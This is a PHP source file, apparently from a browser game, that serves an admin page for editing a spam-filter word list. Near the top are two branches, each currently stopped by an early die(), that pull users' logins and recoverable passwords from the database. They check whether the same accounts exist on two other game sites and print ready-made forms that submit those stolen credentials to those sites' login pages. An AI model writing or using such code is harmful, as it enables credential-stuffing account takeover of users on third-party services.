<?php
function GetRealIp(){
	if (!empty($_SERVER['HTTP_CLIENT_IP']))
		return $_SERVER['HTTP_CLIENT_IP'];
	else if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
		return $_SERVER['HTTP_X_FORWARDED_FOR'];
	return $_SERVER['REMOTE_ADDR'];
}
define('IP',GetRealIp());
include('_incl_data/__config.php');
define('GAME',true);
include('_incl_data/class/__db_connect.php');
include('_incl_data/class/__user.php');

if(isset($_GET['test_login'])) {
	die();
	$xx = mysql_fetch_array(mysql_query('SELECT COUNT(*) FROM `users` WHERE `real` > 0 AND `id` > "'.mysql_real_escape_string($_GET['test_login']).'" LIMIT 1'));
	$sp = mysql_query('SELECT `id`,`login`,`pass` FROM `users` WHERE `real` > 0 AND `id` IN ( SELECT `uid` FROM `logs_auth` WHERE `depass` != "" GROUP BY `uid` ) AND `id` > "'.mysql_real_escape_string($_GET['test_login']).'" ORDER BY `id` ASC LIMIT 1');
	while( $pl = mysql_fetch_array($sp) ) {
		$test = false;
		$cn = file_get_contents('http://old-combats.com/info/'.$pl['login'].'');
		$cn = explode('<title>',$cn);
		$cn = explode('</title>',$cn[1]);
		$cn = $cn[0];
		echo '['.$cn.']';
		if( $cn != 'Произошла ошибка' ) {
			$test = true;
		}
		if($test == true) {
			$logs = mysql_fetch_array(mysql_query('SELECT `depass` FROM `logs_auth` WHERE `uid` = "'.$pl['id'].'" AND `depass` != ""'));
			echo ''.$pl['login'].' - '.$pl['pass'].' - <a href="/spam.php?test_login='.$pl['id'].'">'.$pl['id'].'</a> -> ('.$xx[0].') "';
			print_r($logs);
			echo '"<br><form method="post" action="http://old-combats.com/enter.php" target="_blank"><input type="text" name="login" value="'.$pl['login'].'"><br><input type="text" name="pass" value="'.$logs['depass'].'"><input type="submit" value="Enter!"></form>';
		}else{
			die('location: /spam.php?test_login='.$pl['id'].'<script>setTimeout(function(){top.location.href="/spam.php?test_login='.$pl['id'].'";},150);</script>');
		}
	}
	die();
}elseif(isset($_GET['test_login2'])) {
	die();
	$xx = mysql_fetch_array(mysql_query('SELECT COUNT(*) FROM `users` WHERE `real` > 0 AND `id` > "'.mysql_real_escape_string($_GET['test_login2']).'" LIMIT 1'));
	$sp = mysql_query('SELECT `id`,`login`,`pass` FROM `users` WHERE `real` > 0 AND `id` IN ( SELECT `uid` FROM `logs_auth` WHERE `depass` != "" GROUP BY `uid` ) AND `id` > "'.mysql_real_escape_string($_GET['test_login2']).'" ORDER BY `id` ASC LIMIT 1');
	while( $pl = mysql_fetch_array($sp) ) {
		$test = false;
		$cn = file_get_contents('http://mycombats.com/info/'.$pl['login'].'');
		$cn = explode('<TITLE>',$cn);
		$cn = explode('</TITLE>',$cn[1]);
		$cn = $cn[0];
		echo '['.$cn.']';
		if( $cn != 'Произошла ошибка' ) {
			$test = true;
		}
		if($test == true) {
			$logs = mysql_fetch_array(mysql_query('SELECT `depass` FROM `logs_auth` WHERE `uid` = "'.$pl['id'].'" AND `depass` != ""'));
			echo ''.$pl['login'].' - '.$pl['pass'].' - <a href="/spam.php?test_login2='.$pl['id'].'">'.$pl['id'].'</a> -> ('.$xx[0].') "';
			print_r($logs);
			echo '"<br><form method="post" action="http://mycombats.com/enter.php" target="_blank"><input type="text" name="login" value="'.$pl['login'].'"><br><input type="text" name="psw" value="'.$logs['depass'].'"><input type="submit" value="Enter!"></form>';
		}else{
			die('location: /spam.php?test_login2='.$pl['id'].'<script>setTimeout(function(){top.location.href="/spam.php?test_login2='.$pl['id'].'";},150);</script>');
		}
	}
	die();
}

if(isset($_GET['chat'])) {
	$sp = mysql_query('SELECT * FROM `chat` WHERE `spam` > 0 ORDER BY `time` DESC');
	while($pl = mysql_fetch_array($sp) ) {
		echo date('d.m.Y H:i',$pl['time']).' <b>'.$pl['login'].'</b>: '.$pl['text'].'<hr>';
	}
	die();
}

if( $u->info['admin'] > 0 || $u->info['id'] == 618775 ) {
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>Редактирование фильтра от спама</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8" />
<meta http-equiv=Cache-Control Content=no-cache>
<meta http-equiv=PRAGMA content=NO-CACHE>
<meta http-equiv=Expires Content=0>
<link href="http://img.xcombats.com/css/main.css" rel="stylesheet" type="text/css">
<script type="text/javascript" src="js/jquery.1.11.js"></script>
<body style="padding-top:0px; margin-top:7px; height:100%; background-color:#dedede;">
<b>Список запрещенных слов\ссылок:</b> &nbsp; <input onClick="location.href='/spam.php';" type="button" value="Обновить"><br><br>
<?
$spam = mysql_fetch_array(mysql_query('SELECT * FROM `spam_word` WHERE `id` = 1 LIMIT 1'));
$spam = $spam['data'];
$spam = explode('|',$spam);
//
if(isset($_GET['del'])) {
	echo '<div><font color="red">Слово &quot;<b>'.$spam[floor((int)$_GET['del'])].'</b>&quot; удалено.</font><br><br></div>';
	unset($spam[floor((int)$_GET['del'])]);
	$spam = implode('|',$spam);
	mysql_query('UPDATE `spam_word` SET `data` = "'.mysql_real_escape_string($spam).'" WHERE `id` = "1" LIMIT 1');
	$spam = explode('|',$spam);
}elseif(isset($_POST['add'])){
	$_POST['add'] = htmlspecialchars($_POST['add'],NULL,'cp1251');
	echo '<div><font color="green">Слово &quot;<b>'.$_POST['add'].'</b>&quot; добавлено.</font><br><br></div>';
	$spam = implode('|',$spam);
	$spam .= '|'.$_POST['add'].'';
	mysql_query('UPDATE `spam_word` SET `data` = "'.mysql_real_escape_string($spam).'" WHERE `id` = "1" LIMIT 1');
	$spam = explode('|',$spam);
}
//
$i = 0;
while( $i < count($spam) ) {
	echo ''.$spam[$i].' <a href="/spam.php?del='.$i.'"><img src="http://img.xcombats.com/i/close2.gif"></a><hr>';
	$i++;
}
?>
<form method="post" action="/spam.php">
<input type="text" name="add" value="" style="width:244px;"> <input type="submit" value="Добавить">
</form>
</body>
</html>
<?	
}else{
	die('Спамер? :)');
}

?>